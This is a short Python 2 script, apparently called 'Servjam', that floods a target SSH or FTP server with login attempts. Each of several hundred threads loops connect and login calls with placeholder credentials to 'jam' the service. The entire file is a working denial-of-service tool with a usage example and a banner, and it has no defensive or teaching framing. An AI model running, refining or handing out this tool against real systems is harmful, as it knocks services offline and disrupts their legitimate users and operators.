import sys
import logging
from time import sleep
import paramiko
import threading
from ftplib import FTP

def output():
	list = ['[|]','[/]','[-]','[\]']
	while True:
		for elem in list:
			try:
				sys.stdout.write('\r' + elem + ' Jamming ' + sys.argv[1] + ' (' + service.upper() + ')')
				sleep(0.1)
				sys.stdout.flush()
			except KeyboardInterrupt:
				sys.exit()

def tryCon(svr, port, service):
	if service.lower() == 'ssh':
		global ssh
		logging.raiseExceptions=False
		while True:
			try:
				ssh.connect(svr, port=port, username='username', password='password')
			except:
				pass
	elif service.lower() == 'ftp':
		ftp = FTP()
		try:
			ftp.connect(svr, int(port))
			while True:
				try:
					ftp.login('username', 'password')
				except:
					pass
		except:
			pass

def threadFunc():
	for i in range(int(threads)):
		t = threading.Thread(target=tryCon, args=(server, int(port), service))
		t.start()

def main():
	global ssh
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		global server
		global port
		global threads
		global service
		server, port = sys.argv[1].split(':')
		threads = sys.argv[2]
		service = sys.argv[3][1:]
	except:
		print 'Usage:\n\tpython %s server:port threads -service'%(sys.argv[0])
		print '\nExample:\n\tpython %s 192.168.1.251:22 400 -ssh'%(sys.argv[0])
		print '\nNote:\n\t1) Due to the use of threads, ^C is unavailable. Use ^Z or close the window.\n\t2) Available target services: SSH, FTP'
		sys.exit()
	print '''
  ___                 _            
 / __| ___ _ ___ ___ | |__ _ _ __  
 \__ \/ -_) '_\ V / || / _` | '  \ 
 |___/\___|_|  \_/ \__/\__,_|_|_|_|
                                   
	'''
	threading.Thread(target=output).start()
	threading.Thread(target=threadFunc).start()
if __name__ == '__main__':
	main()
